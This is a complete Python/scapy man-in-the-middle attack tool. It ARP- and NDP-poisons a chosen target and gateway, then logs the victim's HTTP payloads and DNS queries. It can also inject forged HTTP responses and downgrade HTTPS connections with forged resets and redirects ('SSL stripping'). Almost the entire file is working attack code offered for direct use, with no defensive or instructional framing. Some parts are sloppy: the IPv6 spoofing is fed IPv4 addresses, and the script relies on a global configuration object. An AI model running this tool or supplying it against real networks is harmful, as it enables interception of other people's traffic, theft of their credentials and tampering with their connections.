#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from scapy.all import (
    sniff, send, sendp, ARP, Ether, IP, TCP, DNS, DNSQR, Raw,
    conf, get_if_hwaddr, getmacbyip, get_if_list, IPv6, ICMPv6ND_NA,
    ICMPv6NDOptDstLLAddr, UDP, hexdump
)
import threading
import argparse
import time
import sys
import logging
from queue import Queue, Empty, Full
import signal
import os
import re

# Logging to file and console
logging.basicConfig(
    filename='cmitm.log',
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)
console = logging.StreamHandler()
console.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(message)s')
console.setFormatter(formatter)
logging.getLogger('').addHandler(console)

class Config:
    def __init__(self, args):
        self.interface = args.interface
        self.filter = args.filter
        self.max_packets = 10000
        self.spoof_interval = args.spoof_interval
        self.queue_timeout = 1
        self.queue_size = args.queue_size
        self.ipv6_enabled = args.ipv6
        self.ssl_strip = args.ssl_strip

class StealthMITM:
    def __init__(self, target_ip, gateway_ip, interface, inject=False, ipv6=False, ssl_strip=False):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.target_mac = getmacbyip(target_ip)
        self.gateway_mac = getmacbyip(gateway_ip)
        self.my_mac = get_if_hwaddr(interface)
        self.running = False
        self.packet_queue = Queue(maxsize=config.queue_size)
        self.stats = {'total': 0, 'http': 0, 'dns': 0, 'dropped': 0, 'ipv6': 0, 'ssl_stripped': 0}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.inject = inject
        self.ipv6 = ipv6
        self.ssl_strip = ssl_strip
        self.https_ports = {443, 8443}
        self.redirect_cache = {}

    def arp_spoof(self):
        try:
            while not self.stop_event.is_set():
                pkt_target = Ether(src=self.my_mac, dst=self.target_mac) / \
                             ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.target_mac)
                pkt_gateway = Ether(src=self.my_mac, dst=self.gateway_mac) / \
                              ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
                sendp(pkt_target, iface=self.interface, verbose=0)
                sendp(pkt_gateway, iface=self.interface, verbose=0)

                if self.ipv6:
                    self.ndp_spoof()

                time.sleep(config.spoof_interval)
        except Exception as e:
            logging.error(f"Spoofing error: {e}")

    def ndp_spoof(self):
        try:
            pkt_target = Ether(src=self.my_mac, dst=self.target_mac) / \
                         IPv6(src=self.gateway_ip, dst=self.target_ip) / \
                         ICMPv6ND_NA(tgt=self.gateway_ip, R=0) / \
                         ICMPv6NDOptDstLLAddr(lladdr=self.my_mac)

            pkt_gateway = Ether(src=self.my_mac, dst=self.gateway_mac) / \
                          IPv6(src=self.target_ip, dst=self.gateway_ip) / \
                          ICMPv6ND_NA(tgt=self.target_ip, R=0) / \
                          ICMPv6NDOptDstLLAddr(lladdr=self.my_mac)

            sendp(pkt_target, iface=self.interface, verbose=0)
            sendp(pkt_gateway, iface=self.interface, verbose=0)
        except Exception as e:
            logging.error(f"NDP spoofing error: {e}")

    def restore_arp(self):
        try:
            pkt_target = Ether(src=self.my_mac, dst=self.target_mac) / \
                         ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwsrc=self.gateway_mac)
            pkt_gateway = Ether(src=self.my_mac, dst=self.gateway_mac) / \
                          ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwsrc=self.target_mac)

            if self.ipv6:
                ndp_target = Ether(src=self.my_mac, dst=self.target_mac) / \
                             IPv6(src=self.gateway_ip, dst=self.target_ip) / \
                             ICMPv6ND_NA(tgt=self.gateway_ip, R=1) / \
                             ICMPv6NDOptDstLLAddr(lladdr=self.gateway_mac)

                ndp_gateway = Ether(src=self.my_mac, dst=self.gateway_mac) / \
                              IPv6(src=self.target_ip, dst=self.gateway_ip) / \
                              ICMPv6ND_NA(tgt=self.target_ip, R=1) / \
                              ICMPv6NDOptDstLLAddr(lladdr=self.target_mac)

                for _ in range(10):
                    sendp(ndp_target, iface=self.interface, verbose=0)
                    sendp(ndp_gateway, iface=self.interface, verbose=0)

            for _ in range(10):
                sendp(pkt_target, iface=self.interface, verbose=0)
                sendp(pkt_gateway, iface=self.interface, verbose=0)
                time.sleep(0.1)

            logging.info("ARP/NDP tables restored.")
        except Exception as e:
            logging.error(f"Restoration error: {e}")

    def process_packet(self, packet):
        try:
            logging.debug(f"Packet summary: {packet.summary()}")
            if packet.haslayer(Raw):
                try:
                    logging.debug(f"Raw payload: {packet[Raw].load[:100].decode(errors='replace')}")
                except Exception as e:
                    logging.debug(f"Could not decode raw payload: {e}")

            # Uncomment for detailed packet view:
            # logging.debug("Packet hexdump:")
            # hexdump(packet)

            with self.lock:
                self.stats['total'] += 1

            if packet.haslayer(IP):
                self.process_ipv4_packet(packet)
            elif packet.haslayer(IPv6) and self.ipv6:
                self.process_ipv6_packet(packet)
        except Exception as e:
            logging.error(f"Packet processing error: {e}")

    def process_ipv4_packet(self, packet):
        if packet.haslayer(TCP):
            if packet[TCP].dport == 80 and packet.haslayer(Raw):
                self.process_http(packet)
            elif packet[TCP].dport in self.https_ports and self.ssl_strip:
                self.attempt_ssl_strip(packet)
            elif packet[TCP].dport in self.https_ports:
                logging.info(f"HTTPS traffic detected from {packet[IP].src} -> {packet[IP].dst} (encrypted)")
        elif packet.haslayer(DNS) and packet[DNS].qr == 0:
            query = packet[DNSQR].qname.decode(errors='replace')
            logging.info(f"DNS Query from {packet[IP].src}: {query}")
            with self.lock:
                self.stats['dns'] += 1

    def process_ipv6_packet(self, packet):
        with self.lock:
            self.stats['ipv6'] += 1

        if packet.haslayer(TCP):
            if packet[TCP].dport == 80 and packet.haslayer(Raw):
                load = packet[Raw].load.decode(errors='replace')
                logging.info(f"IPv6 HTTP {packet[IPv6].src} -> {packet[IPv6].dst}: {load[:50]}")
                with self.lock:
                    self.stats['http'] += 1
            elif packet[TCP].dport in self.https_ports:
                logging.info(f"IPv6 HTTPS traffic detected from {packet[IPv6].src} -> {packet[IPv6].dst}")

    def process_http(self, packet):
        load = packet[Raw].load.decode(errors='replace')
        logging.info(f"HTTP {packet[IP].src} -> {packet[IP].dst}: {load[:50]}")
        with self.lock:
            self.stats['http'] += 1

        if self.inject:
            self.inject_response(packet)

        if self.ssl_strip and "Location: https://" in load:
            self.cache_https_redirect(packet, load)

    def attempt_ssl_strip(self, packet):
        host = self.get_host_from_packet(packet)
        if host in self.redirect_cache:
            http_port = self.redirect_cache[host]

            rst_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                      TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="R")
            send(rst_pkt, iface=self.interface, verbose=0)

            redirect_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                          TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="PA") / \
                          Raw(load=f"HTTP/1.1 302 Found\r\nLocation: http://{host}:{http_port}\r\n\r\n")
            send(redirect_pkt, iface=self.interface, verbose=0)

            with self.lock:
                self.stats['ssl_stripped'] += 1
            logging.info(f"SSL Stripped: {host}")

    def cache_https_redirect(self, packet, http_load):
        match = re.search(r"Location: https://([^/]+)", http_load)
        if match:
            host = match.group(1)
            self.redirect_cache[host.split(':')[0]] = packet[TCP].dport
            logging.info(f"Cached HTTPS redirect for {host}")

    def get_host_from_packet(self, packet):
        if packet.haslayer(Raw):
            raw = packet[Raw].load.decode(errors='ignore')
            host_match = re.search(r"Host: ([^\r\n]+)", raw)
            if host_match:
                return host_match.group(1).split(':')[0]
        return packet[IP].dst

    def inject_response(self, packet):
        if packet.haslayer(TCP) and packet[TCP].dport == 80:
            spoofed_response = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                              TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags="PA",
                                  seq=packet[TCP].ack, ack=packet[TCP].seq + len(packet[Raw].load)) / \
                              Raw(load="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Stealth Injection</h1>")
            send(spoofed_response, iface=self.interface, verbose=0)
            logging.info(f"Injected response to {packet[IP].src}")

    def start(self):
        self.running = True
        self.stop_event.clear()
        threading.Thread(target=self.arp_spoof, daemon=True).start()
        sniff(iface=self.interface, prn=self.process_packet, filter=config.filter, store=0)

    def stop(self):
        self.running = False
        self.stop_event.set()
        self.restore_arp()

    def signal_handler(self, sig, frame):
        print("\nReceived SIGINT. Stopping MITM attack...")
        self.stop()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enhanced Stealth MITM Tool with SSL Stripping and IPv6 Support")
    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Network interface to use")
    parser.add_argument("--spoof-interval", type=float, default=2.0, help="Seconds between ARP spoofs (default: 2)")
    parser.add_argument("--queue-size", type=int, default=1000, help="Max packet queue size (default: 1000)")
    parser.add_argument("--filter", default="tcp or udp or port 80 or port 443", help="BPF filter for sniffing")
    parser.add_argument("--inject", action="store_true", help="Enable HTTP response injection")
    parser.add_argument("--ipv6", action="store_true", help="Enable IPv6 NDP spoofing support")
    parser.add_argument("--ssl-strip", action="store_true", help="Enable SSL stripping (HTTPS downgrade)")

    args = parser.parse_args()

    available_interfaces = get_if_list()
    if args.interface not in available_interfaces:
        logging.error(f"Interface {args.interface} not found. Available: {available_interfaces}")
        sys.exit(1)

    config = Config(args)
    mitm = StealthMITM(
        args.target_ip,
        args.gateway_ip,
        args.interface,
        inject=args.inject,
        ipv6=args.ipv6,
        ssl_strip=args.ssl_strip
    )

    logging.info(f"Starting MITM on interface {args.interface} | Target: {args.target_ip} | Gateway: {args.gateway_ip} | IPv6: {args.ipv6} | SSLStrip: {args.ssl_strip} | Inject: {args.inject}")

    signal.signal(signal.SIGINT, mitm.signal_handler)

    try:
        mitm.start()
    except Exception as e:
        logging.error(f"MITM failed: {e}")
    finally:
        mitm.stop()
